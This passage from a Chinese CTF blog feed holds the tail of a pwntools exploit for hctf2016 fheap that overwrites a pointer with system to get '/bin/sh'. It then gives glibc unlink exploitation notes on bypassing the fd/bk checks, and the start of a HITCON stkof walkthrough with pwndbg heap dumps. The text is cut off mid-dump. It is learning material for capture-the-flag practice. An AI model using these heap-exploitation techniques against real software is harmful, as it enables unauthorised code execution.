class="string">&#x27;skye&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># system(&#x27;/bin/sh||aaa……&#x27;)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh||&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>) + p64(system_addr)</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&#x27;b *$rebase(0x2020C0)&#x27;)</span></span><br><span class="line"><span class="comment"># # gdb.attach(p,&#x27;b *$rebase(0xDBB)&#x27;)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h4><ul><li><p><a href="https://www.cnblogs.com/shangye/p/6156350.html">hctf2016 fheap学习(FlappyPig队伍的解法)</a></p></li><li><p><a href="https://www.cnblogs.com/shangye/p/6156391.html">hctf2016 fheap学习(FreeBuf发表的官方解法)</a></p><p>DlyELF 泄露 libc 地址</p></li><li><p><a href="http://blog.eonew.cn/archives/586#UAFfreeShortputs">hctf2016-fheap Writeup</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unlink学习笔记</title>
      <link href="archives/bea9d64/"/>
      <url>archives/bea9d64/</url>
      
        <content type="html"><![CDATA[<blockquote><p>绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录</p></blockquote><h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我们在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。</p><p>我们先来简单回顾一下 unlink 的目的与过程，其目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-09-12-Frn2JF59m2Aeb8tf.png"></p><p>下面我们首先介绍一下 unlink 最初没有防护时的利用方法，然后介绍目前利用 unlink 的方式。</p><h3 id="古老的-unlink"><a href="#古老的-unlink" class="headerlink" title="古老的 unlink"></a>古老的 unlink</h3><p>在最初 unlink 实现的时候，其实是没有对 chunk 的 size 检查和双向链表检查的，即没有如下检查代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure><p><strong>这里我们以 32 位为例</strong>，假设堆内存最初的布局是下面的样子</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-09-12-GLmm47iSigCdTg9z.png"></p><p>现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。那么如果我们通过某种方式（<strong>比如溢出</strong>）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时</p><ul><li>glibc 判断这个块是 small chunk</li><li>判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</li><li>判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</li><li>继而对 Nextchunk 采取 unlink 操作</li></ul><p>那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下</p><ul><li>FD=P-&gt;fd = target addr -12</li><li>BK=P-&gt;bk = expect value</li><li>FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value</li><li>BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12</li></ul><p><strong>总结：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用前提：使用传入参数</span></span><br><span class="line">P-&gt;fd = target<span class="number">-12</span>;</span><br><span class="line">P-&gt;bk = expect value;</span><br><span class="line"><span class="comment">// 作用效果：</span></span><br><span class="line"><span class="comment">// target addr 覆写为 expect value</span></span><br><span class="line">*(target addr) = expect value;</span><br><span class="line"><span class="comment">// expect value 覆写为 target addr -12</span></span><br><span class="line">*(expect value +<span class="number">8</span>) = target addr <span class="number">-12</span>;</span><br></pre></td></tr></table></figure><p><strong>看起来我们似乎可以通过 unlink 直接实现任意地址读写的目的，但是我们还是需要确保 expect value +8 地址具有可写的权限。</strong></p><p>比如说我们将 target addr 设置为某个 got 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值（expect value）处的代码。<strong>需要注意的是，expect value+8 处的值被破坏了，需要想办法绕过。</strong></p><h3 id="当前的-unlink"><a href="#当前的-unlink" class="headerlink" title="当前的 unlink"></a>当前的 unlink</h3><p><strong>但是，现实是残酷的。。</strong>我们刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们看一下对 fd 和 bk 的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="comment">// FD的下一个chunk是否为P；BK的上一个chunk是否为P；</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br></pre></td></tr></table></figure><p>假如此时 FD、BK 指针内容为：</p><ul><li>FD-&gt;bk = target addr - 12 + 12=target_addr</li><li>BK-&gt;fd = expect value + 8</li></ul><p>那么我们上面所利用的修改 GOT 表项的方法就<del>可能</del>不可用了，但是我们可以通过伪造的方式绕过这个机制。</p><p>首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要</p><ul><li><p><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></p><p>前一个 chunk bk 指向 P </p></li><li><p><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></p><p>后一个 chunk fd 指向 P</p></li></ul><p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p><ul><li><p><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></p><p>前一个 chunk bk 更新为后一个 chunk 地址</p></li><li><p><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></p><p>后一个 chunk fd 更新为前一个 chunk 地址</p></li></ul><p><strong>小结</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 规避检查伪造条件</span></span><br><span class="line"><span class="comment">// fakeFD == P-&gt;fd; fakeBK == P-&gt;bk;</span></span><br><span class="line">*(fakeFD + <span class="number">12</span>) == P;</span><br><span class="line">*(fakeBK + <span class="number">8</span>) == P;</span><br><span class="line"><span class="comment">// unlink 结果</span></span><br><span class="line">*(fakeFD + <span class="number">12</span>) = fakeBK;</span><br><span class="line">*(fakeBK + <span class="number">8</span>) = fakeFD;</span><br></pre></td></tr></table></figure><p>如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fakeFD + 12 = P;fakeBK + 8 = P;</span></span><br><span class="line">*(fakeFD + <span class="number">12</span>) = *P = fakeBK = P - <span class="number">8</span>;</span><br><span class="line">*(fakeBK + <span class="number">8</span>) = *P = fakeFD = P - <span class="number">12</span>;</span><br></pre></td></tr></table></figure><p>化简后 unlink 结果为：</p><ul><li><code>*P = P - 8</code></li><li><code>*P = P - 12</code></li></ul><p>即通过此方式，<strong>P 的指针指向了比自己低 12 的地址处</strong>。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。</p><blockquote><p>这里指的低 12 是在 32 位系统下，如果是 64 位系统就是 3*8 = 24 。</p><p>归纳起来就是<strong>将 P 指针指向比 P 低 3 个机器周期的地址处</strong></p></blockquote><p>如果我们想要使得两者都指向 P，只需要按照如下方式修改即可</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-09-12-wdgIzUeJnhDHAlgF.png"></p><p>需要注意的是，这里我们并没有违背下面的约束，因为 P 在 Unlink 前是指向正确的 chunk 的指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line"><span class="comment">// 判断当前大小 chunksize 与 nextchunk 的 prev_size 记录值是否一致</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">     malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br></pre></td></tr></table></figure><p><strong>此外，其实如果我们设置 next chunk 的 fd 和 bk 均为 nextchunk 的地址也是可以绕过上面的检测的。但是这样的话，并不能达到修改指针内容的效果。</strong></p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol><li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li><li>已知位置存在一个指针指向可进行 UAF 的 chunk</li></ol><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-09-13-XLVY9VUAkdRn2Wo6.jpg"></p><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-09-13-N8bKV8OpG6TI1wP7.jpg"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>设指向可 UAF chunk 的指针的地址为 ptr</p><ol><li>修改 fd 为 ptr - 0x18</li><li>修改 bk 为 ptr - 0x10</li><li>触发 unlink</li></ol><p>ptr 处的指针会变为 ptr - 0x18。</p><h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><blockquote><p>做题环境：Ubuntu 16.04</p></blockquote><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">        </span><br><span class="line">stkof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked</span><br></pre></td></tr></table></figure><p>程序存在 4 个功能，经过 IDA 分析后可以分析功能如下</p><ul><li>alloc：输入 size，分配 size 大小的内存，并在 bss 段记录对应 chunk 的指针，假设其为 global</li><li>fill：根据指定索引，向分配的内存处读入数据，数据长度可控，<strong>这里存在堆溢出的情况</strong></li><li>free_chunk：根据指定索引，释放已经分配的内存块</li><li>print：这个功能并没有什么卵用，本来以为是可以输出内容，结果什么也没有输出</li></ul><h3 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h3><p>fiil 写入字符长度是由用户决定的，这里就存在一个堆溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">idx = atol(&amp;s);</span><br><span class="line"><span class="keyword">if</span> ( idx &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line"><span class="keyword">if</span> ( !globals[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">size = atoll(&amp;s);</span><br><span class="line">ptr = globals[idx];</span><br></pre></td></tr></table></figure><h3 id="IO-缓冲区问题分析"><a href="#IO-缓冲区问题分析" class="headerlink" title="IO 缓冲区问题分析"></a>IO 缓冲区问题分析</h3><p>这条题目堆空间一开始可能和我们想象的不一样，这是由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为 1024 和 1024。具体如下，可以进行调试查看。</p><p>初次调用 fgets 时，malloc 会分配缓冲区 1024 大小。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">*RAX  0x0</span><br><span class="line">*RBX  0x400</span><br><span class="line">*RCX  0x7ffff7b03c34 (__fxstat64+20) ◂— cmp    rax, -0x1000 &#x2F;* &#39;H&#x3D;&#39; *&#x2F;</span><br><span class="line">*RDX  0x88</span><br><span class="line">*RDI  0x400</span><br><span class="line">*RSI  0x7fffffffd860 ◂— 0x16</span><br><span class="line">*R8   0x1</span><br><span class="line">*R9   0x0</span><br><span class="line">*R10  0x7ffff7fd2700 ◂— 0x7ffff7fd2700</span><br><span class="line">*R11  0x246</span><br><span class="line">*R12  0xa</span><br><span class="line">*R13  0x9</span><br><span class="line"> R14  0x0</span><br><span class="line">*R15  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288</span><br><span class="line">*RBP  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288</span><br><span class="line">*RSP  0x7fffffffd858 —▸ 0x7ffff7a7a1d5 (_IO_file_doallocate+85) ◂— mov    rsi, rax</span><br><span class="line">*RIP  0x7ffff7a91130 (malloc) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x7ffff7a91130 &lt;malloc&gt;        push   rbp &lt;0x7ffff7dd18e0&gt;</span><br><span class="line">...，省略</span><br><span class="line"> ► f 0     7ffff7a91130 malloc</span><br><span class="line">   f 1     7ffff7a7a1d5 _IO_file_doallocate+85</span><br><span class="line">   f 2     7ffff7a88594 _IO_doallocbuf+52</span><br><span class="line">   f 3     7ffff7a8769c _IO_file_underflow+508</span><br><span class="line">   f 4     7ffff7a8860e _IO_default_uflow+14</span><br><span class="line">   f 5     7ffff7a7bc6a _IO_getline_info+170</span><br><span class="line">   f 6     7ffff7a7bd78</span><br><span class="line">   f 7     7ffff7a7ab7d fgets+173</span><br><span class="line">   f 8           400d2e</span><br><span class="line">   f 9     7ffff7a2d830 __libc_start_main+240</span><br></pre></td></tr></table></figure><p>分配之后，堆如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0xe05410</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0xe05000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 1041,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe05410 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 134129,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当分配16大小的内存后，堆布局如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0xe05430</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0xe05000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 1041,</span><br><span class="line">  fd &#x3D; 0xa3631,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe05410 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 33,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x20bd1</span><br><span class="line">&#125;</span><br><span class="line">0xe05430 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 134097,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当使用 printf 函数，会分配 1024 字节空间，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">*RAX  0x0</span><br><span class="line">*RBX  0x400</span><br><span class="line">*RCX  0x7ffff7b03c34 (__fxstat64+20) ◂— cmp    rax, -0x1000 &#x2F;* &#39;H&#x3D;&#39; *&#x2F;</span><br><span class="line">*RDX  0x88</span><br><span class="line">*RDI  0x400</span><br><span class="line">*RSI  0x7fffffffd1c0 ◂— 0x16</span><br><span class="line"> R8   0x0</span><br><span class="line">*R9   0x0</span><br><span class="line">*R10  0x0</span><br><span class="line">*R11  0x246</span><br><span class="line">*R12  0x1</span><br><span class="line">*R13  0x7fffffffd827 ◂— 0x31 &#x2F;* &#39;1&#39; *&#x2F;</span><br><span class="line"> R14  0x0</span><br><span class="line">*R15  0x400de4 ◂— and    eax, 0x2e000a64 &#x2F;* &#39;%d\n&#39; *&#x2F;</span><br><span class="line">*RBP  0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2284</span><br><span class="line">*RSP  0x7fffffffd1b8 —▸ 0x7ffff7a7a1d5 (_IO_file_doallocate+85) ◂— mov    rsi, rax</span><br><span class="line">*RIP  0x7ffff7a91130 (malloc) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x7ffff7a91130 &lt;malloc&gt;       push   rbp &lt;0x7ffff7dd2620&gt;</span><br><span class="line">。。。省略</span><br><span class="line">► f 0     7ffff7a91130 malloc</span><br><span class="line">   f 1     7ffff7a7a1d5 _IO_file_doallocate+85</span><br><span class="line">   f 2     7ffff7a88594 _IO_doallocbuf+52</span><br><span class="line">   f 3     7ffff7a878f8 _IO_file_overflow+456</span><br><span class="line">   f 4     7ffff7a8628d _IO_file_xsputn+173</span><br><span class="line">   f 5     7ffff7a5ae00 vfprintf+3216</span><br><span class="line">   f 6     7ffff7a62899 printf+153</span><br><span class="line">   f 7           4009cd</span><br><span class="line">   f 8           400cb1</span><br><span class="line">   f 9     7ffff7a2d830 __libc_start_main+240</span><br></pre></td></tr></table></figure><p>堆布局如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0xe05840</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0xe05000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 1041,</span><br><span class="line">  fd &#x3D; 0xa3631,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe05410 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 33,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x411</span><br><span class="line">&#125;</span><br><span class="line">0xe05430 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 1041,</span><br><span class="line">  fd &#x3D; 0xa4b4f,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe05840 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 133057,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此后，无论是输入输出都不会再申请缓冲区了。所以我们最好最初的申请一个 chunk 来把这些缓冲区给申请了，方便之后操作。</p><p>但是，比较有意思的是，如果我们是 gdb.attach 上去的话，第一个缓冲区分配的大小为 4096 大小。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x1e9b010</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x1e9a000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 4113,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x1e9b010 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 135153,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>申请第一个堆（0x48），之后还会出现第二个缓冲区堆块（1040）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;重新启动过，所以地址与上面不对应，但是结构是一样的</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">0xe05000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 4113, </span><br><span class="line">  fd &#x3D; 0xa383231, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 